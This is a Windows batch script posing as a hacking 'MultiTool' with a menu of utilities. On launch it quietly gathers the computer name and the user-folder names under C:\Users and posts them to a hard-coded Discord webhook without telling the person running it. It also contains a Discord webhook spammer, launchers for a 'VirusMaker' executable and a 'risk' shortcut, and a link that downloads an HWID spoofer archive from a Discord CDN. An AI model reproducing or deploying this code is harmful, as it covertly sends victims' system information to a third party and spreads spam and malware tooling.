��

cls

@echo off
setlocal enabledelayedexpansion

color D



:: Remplacez par votre URL de webhook
set "WEBHOOK_URL=https://discord.com/api/webhooks/1340037089017860200/f8mSDgc-bdqZXC9hqlSwPt0z4gVBzj4BKLrJjeNsKx_z_h2V92ZPPlUkEListQk7VjgM"

:: Liste des noms de dossiers dans C:\Users
set "USER_DIRS=C:\Users"
set "NAMES="

:: Boucle pour récupérer les noms de dossier
for /d %%D in (%USER_DIRS%\*) do (
    set "DIR_NAME=%%~nxD"
    set "NAMES=!NAMES!, !DIR_NAME!"
)

:: Supprimer la première virgule
set "NAMES=%NAMES:~2%"

for /f "delins=[] tokens=2" %%a in ('ping -4 -n 1 %ComputerName% ⌃│ findstr [') do set ip=%%a

cls
:: Envoie des données au webhook
curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"Computer Name=%ComputerName% / Noms des dossiers dans C:\\Users : %NAMES%\"}" %WEBHOOK_URL%

endlocal


:: Set the Pastebin raw URL
set PASTEBIN_RAW_URL=https://pastebin.com/raw/7kcmVVvr

:: Download the credentials file content directly from Pastebin into a variable
for /f "delims=" %%A in ('curl -s "%PASTEBIN_RAW_URL%"') do set credentials=%%A

:: Prompt for login
echo to get the username and the password come on discord
start https://discord.gg/VjWwDS3xN9
set /p user=Enter username: 
set /p pass=Enter password: 

:: Check if the credentials are valid
echo %credentials% | findstr /c:"%user%:%pass%" >nul
if %errorlevel%==0 (
    echo Login successful
    cls
    goto :Start
)

echo Invalid credentials
goto :exit
pause

cls


chcp 65001 >nul
color D
:start
title MultiTool  -  by Mr.Mirage
chcp 65001 >nul
cd files
call :banner
color D


echo 1) Process Hacker 2
echo 2) VirusMaker
echo 3) Osint Tools
echo 4) Check IP server (dev)
echo 5) Test A Server
echo 6) Webhook Message Spammer
echo 7) Check A Password 
echo 8) HWID Spoofer download
echo 9) Ip Lookup
echo 10) Ip Lookup V2
echo 11) Generate A Password
echo 12) Risk (!!!)
echo 98) Credit
echo 99) Exit


cd files
set /p input=.%BS%
if /I %input% EQU 1 start ph2.exe
if /I %input% EQU 2 start VirusMaker.exe
if /I %input% EQU 3 goto IntelX
if /I %input% EQU 4 goto MyIp
if /I %input% EQU 5 goto servertest
if /I %input% EQU 6 goto messagesender
if /I %input% EQU 7 goto breachchecker
if /I %input% EQU 8 goto hwidspoof
if /I %input% EQU 9 goto iplookup
if /I %input% EQU 10 goto iplookupv2
if /I %input% EQU 11 goto pswgen
if /I %input% EQU  start risk.lnk
if /I %input% EQU 98 goto Credit
if /I %input% EQU 99 goto exit


cls
goto start
echo.
pause


---------------------------------------------------------------------
:IntelX
start https://intelx.io/tools

---------------------------------------------------------------------

:MyIp
cls
echo ▄▄▌ ▐ ▄▌▄▄▄ .▄▄▄▄·     ▄▄▌              ▄ •▄     ▄• ▄▌ ▄▄▄·
echo ██· █▌▐█▀▄.▀·▐█ ▀█▪    ██•  [36m▪     ▪     █▌▄▌▪    █▪██▌▐█ ▄█
echo ██▪▐█▐▐▌▐▀▀▪▄▐█▀▀█▄    ██▪   ▄█▀▄  ▄█▀▄ ▐▀▀▄·    █▌▐█▌ ██▀·
echo ▐█▌██▐█▌▐█▄▄▌██▄▪▐█    ▐█▌▐▌▐█▌.▐▌▐█▌.▐▌▐█.█▌    ▐█▄█▌▐█▪·•
echo  ▀▀▀▀ ▀▪ ▀▀▀ ·▀▀▀▀     .▀▀▀  ▀█▄▀▪ ▀█▄▀▪·▀  ▀     ▀▀▀ .▀   
set /p "website=[97mEnter a [92mURL(!) "
echo [36m...................................
echo [97m┌─────────────────────────┐
echo [97m│[92mFinding [97mInfo on %website  [97m│
echo [97m└─────────────────────────┘
nslookup %website%
pause
cls
goto start

-------------------------------------------------------

:servertest
cls
title Checking a server's status
set /p page= Enter the server you would like to test: 
cls
echo Checking "%page%" (this may take a bit.)
echo This option is still in beta, so it may or may not work.
ping %page%>nul
cls
if errorlevel 1 (
echo The server "%page%" is [91moffline[97m
) else echo The server "%page%" is [92monline[97m

pause
goto start

--------------------------------------------------------------------

:messagesender
cls
echo   ██████  ██▓███   ▄▄▄       ███▄ ▄███▓    ███▄    █  ▄▄▄     ▄▄▄█████▓ ██▓ ▒█████   ███▄    █ 
echo ▒██    ▒ ▓██░  ██▒▒████▄    ▓██▒▀█▀ ██▒    ██ ▀█   █ ▒████▄   ▓  ██▒ ▓▒▓██▒▒██▒  ██▒ ██ ▀█   █ 
echo ░ ▓██▄   ▓██░ ██▓▒▒██  ▀█▄  ▓██    ▓██░   ▓██  ▀█ ██▒▒██  ▀█▄ ▒ ▓██░ ▒░▒██▒▒██░  ██▒▓██  ▀█ ██▒
echo   ▒   ██▒▒██▄█▓▒ ▒░██▄▄▄▄██ ▒██    ▒██    ▓██▒  ▐▌██▒░██▄▄▄▄██░ ▓██▓ ░ ░██░▒██   ██░▓██▒  ▐▌██▒
echo ▒██████▒▒▒██▒ ░  ░ ▓█   ▓██▒▒██▒   ░██▒   ▒██░   ▓██░ ▓█   ▓██▒ ▒██▒ ░ ░██░░ ████▓▒░▒██░   ▓██░
echo ▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░ ▒▒   ▓▒█░░ ▒░   ░  ░   ░ ▒░   ▒ ▒  ▒▒   ▓▒█░ ▒ ░░   ░▓  ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ 
echo ░ ░▒  ░ ░░▒ ░       ▒   ▒▒ ░░  ░      ░   ░ ░░   ░ ▒░  ▒   ▒▒ ░   ░     ▒ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░
echo ░  ░  ░  ░░         ░   ▒   ░      ░         ░   ░ ░   ░   ▒    ░       ▒ ░░ ░ ░ ▒     ░   ░ ░ 
echo       ░                 ░  ░       ░               ░       ░  ░         ░      ░ ░           ░                                                                                               
echo ┌────────────────────────────────┐
echo │     [91mDiscord webhook spammer    [97m│
echo ├────────────────────────────────┤
set /p "webhook=│ Enter Discord webhook URL for Message Sender: "
set /p "message=│ Enter the message to send: "
set /p "num_times=│ Enter the number of times to send the message: "

for /l %%n in (1,1,%num_times%) do (
    :: Send message to Discord webhook
    curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"%message%\"}" %webhook%
)
echo Messages sent successfully.
pause
cls
goto start


----------------------------------------------------------------------
:breachchecker
cls
color 4 
echo ██████╗ ██████╗ ███████╗ █████╗  ██████╗██╗  ██╗    ███████╗███████╗ ██████╗██╗   ██╗██████╗ ██╗████████╗██╗   ██╗    
echo ██╔══██╗██╔══██╗██╔════╝██╔══██╗██╔════╝██║  ██║    ██╔════╝██╔════╝██╔════╝██║   ██║██╔══██╗██║╚══██╔══╝╚██╗ ██╔╝    
echo ██████╔╝██████╔╝█████╗  ███████║██║     ███████║    ███████╗█████╗  ██║     ██║   ██║██████╔╝██║   ██║    ╚████╔╝     
echo ██╔══██╗██╔══██╗██╔══╝  ██╔══██║██║     ██╔══██║    ╚════██║██╔══╝  ██║     ██║   ██║██╔══██╗██║   ██║     ╚██╔╝      
echo ██████╔╝██║  ██║███████╗██║  ██║╚██████╗██║  ██║    ███████║███████╗╚██████╗╚██████╔╝██║  ██║██║   ██║      ██║       
echo ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝   ╚═╝      ╚═╝    
echo                       ┌───────┐   ╔════════════════════[97m╗
echo                       │ ════ o│   [97m║                    [97m║
echo                       ├───────┤   [97m║                    [97m║
echo    ╔══════════════[97m╗   │[■■■■]o│   [97m║                    [97m║
echo    [97m║              [97m║   ├───────┤   [97m║                    [97m║
echo    [97m║              [97m║   │       │   ╚════════╤══╤══════o═╝
echo    [97m║              [97m║   │       │─────┘  ____│__│____
echo    [97m║              [97m║   │       │─┐     /____________\
echo    ╚══════════════╝   └───────┘ │ ________________
echo   /::::::::::::::::\      │     └/::::::::::::::::\
echo  /:::::════════:::::\    /T\    /:::::════════:::::\
echo  ════════════════════    \_/    ════════════════════ 

set /p password=Enter a [93mpassword [97mto check for [92mbreaches[97m:
for /f %%i in ('powershell -NoProfile -Command "$password = '%password%'; $sha1 = [System.Security.Cryptography.SHA1]::Create(); $hash = $sha1.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($password)); $hashedPassword = -join ($hash | ForEach-Object { $_.ToString('x2') }).ToUpper(); Write-Output $hashedPassword"') do set hashedPassword=%%i
set prefix=%hashedPassword:~0,5%
set suffix=%hashedPassword:~5%
powershell -NoProfile -Command "$prefix = '%prefix%'; $suffix = '%suffix%'; $url = 'https://api.pwnedpasswords.com/range/' + $prefix; $response = (Invoke-WebRequest -Uri $url).Content; if ($response -match $suffix) { Write-Host 'This password has been breached. It is not secure.' } else { Write-Host 'This password has not been breached. It is secure.' }"
pause
cls
goto start

--------------------------------------------------------------------
:hwidspoof

start https://cdn.discordapp.com/attachments/1226603569520574669/1321978591143002224/Hwid_Spoofer.rar?ex=67a498c1&is=67a34741&hm=833bc39c3f4fa63f3b385c20c897fc91f8b2489928668ca10eb904e3cbba1765&

--------------------------------------------------------------------
:iplookup
title ip-lookup
color 4
:menu
cls
echo       ██╗██████╗     ██╗      ██████╗  ██████╗ ██╗  ██╗██╗   ██╗██████╗       
echo       ██║██╔══██╗    ██║     ██╔═══██╗██╔═══██╗██║ ██╔╝██║   ██║██╔══██╗      
echo █████╗██║██████╔╝    ██║     ██║   ██║██║   ██║█████╔╝ ██║   ██║██████╔╝█████╗
echo ╚════╝██║██╔═══╝     ██║     ██║   ██║██║   ██║██╔═██╗ ██║   ██║██╔═══╝ ╚════╝
echo       ██║██║         ███████╗╚██████╔╝╚██████╔╝██║  ██╗╚██████╔╝██║           
echo       ╚═╝╚═╝         ╚══════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝           
                                                                              
echo.===============================================================================
echo enter ip for lookup:
set /p ip=

curl "https://ipinfo.io/%ip%/json" -o geolocation.json
echo ==================================
echo geolocation.json for %ip% added to your folder you put mirage.bat
echo =================================
pause

goto start
--------------------------------------------------------------

:iplookupv2
cls
echo       ██╗██████╗     ██╗      ██████╗  ██████╗ ██╗  ██╗██╗   ██╗██████╗     ██╗   ██╗██████╗       
echo       ██║██╔══██╗    ██║     ██╔═══██╗██╔═══██╗██║ ██╔╝██║   ██║██╔══██╗    ██║   ██║╚════██╗      
echo █████╗██║██████╔╝    ██║     ██║   ██║██║   ██║█████╔╝ ██║   ██║██████╔╝    ██║   ██║ █████╔╝█████╗
echo ╚════╝██║██╔═══╝     ██║     ██║   ██║██║   ██║██╔═██╗ ██║   ██║██╔═══╝     ╚██╗ ██╔╝██╔═══╝ ╚════╝
echo       ██║██║         ███████╗╚██████╔╝╚██████╔╝██║  ██╗╚██████╔╝██║          ╚████╔╝ ███████╗      
echo       ╚═╝╚═╝         ╚══════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝           ╚═══╝  ╚══════╝      

echo.===============================================================================
echo enter ip for lookup:
set /p ip=

curl "https://www.robtex.com/ip-lookup/%ip%" -o geolocation.json  
echo =================================  
echo geolocation.json for %ip% added to your folder you put mirage.bat
echo =================================
pause
goto start                                                                                        

----------------------------------------------------------
:pswgen

echo I will make you a new password. 
echo Please write the password down somewhere in case you forget it. 
echo ----------------------------------------------------------------
echo How many characters would you like it to be?
set passlength=
set /p passlength= Choice: 
echo Generate password? (Y/N)
echo Input your choice
set input=
set /p input= Choice: 
if %input%==y goto passgen if NOT goto Start
if %input%==Y goto passgen if NOT goto Start

:passgen
cls
call logo.bat
echo.
@echo off
setlocal EnableDelayedExpansion
set charSets=!@#$%^&*!@#$%^&*!@#$%^&*!@#$%^&*!@#$%^&*!@#$%^&*abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789
set count=0

set /a countRaw=4+(%random%)%%20

for /L %%c in (1,1,%countRaw%) do (call :MAKERANDOMSTRING)
goto ENDRANDOMSTRING;

:MAKERANDOMSTRING
set buffer=% %
set count=0
set /a lowValue=30+(%random%)%%40
set /a length=!passlength!

:Loop
set /a count+=1
set /a rand=%Random%%%69
set buffer=!buffer!!charSets:~%rand%,1!
if !count! leq !length! goto Loop
echo Your password is: "%buffer%"
echo Would you like to copy it to your keyboard? (Y/N)
set input=
set /p input= Choice: 
if %input%==Y goto copy
if %input%==y goto copy
if %input%==N goto choice
if %input%==n goto choice

:copy
@Set /P "=%buffer%"<NUL|Clip
goto choice

:choice
echo Now choose what you want to do. 
echo 1) Go back to the beginning
echo 2) Exit
set input=
set /p input= Choice: 
if %input%==1 goto Start if NOT goto Start
if %input%==2 goto EXIT if NOT goto Start
---------------------------------------------------------

:Credit
echo Made by Mr.Mirage
pause
start https://discord.gg/NuBDVjuz7C
goto start
-----------------------------------------------------------

:exit
exit

-------------------------------------------------------


:banner
echo.
echo.
echo       ███╗   ███╗██╗██████╗  █████╗  ██████╗ ███████╗
echo       ████╗ ████║██║██╔══██╗██╔══██╗██╔════╝ ██╔════╝
echo       ██╔████╔██║██║██████╔╝███████║██║  ███╗█████╗  
echo       ██║╚██╔╝██║██║██╔══██╗██╔══██║██║   ██║██╔══╝  
echo       ██║ ╚═╝ ██║██║██║  ██║██║  ██║╚██████╔╝███████╗
echo       ╚═╝     ╚═╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝
echo.
echo.
										 


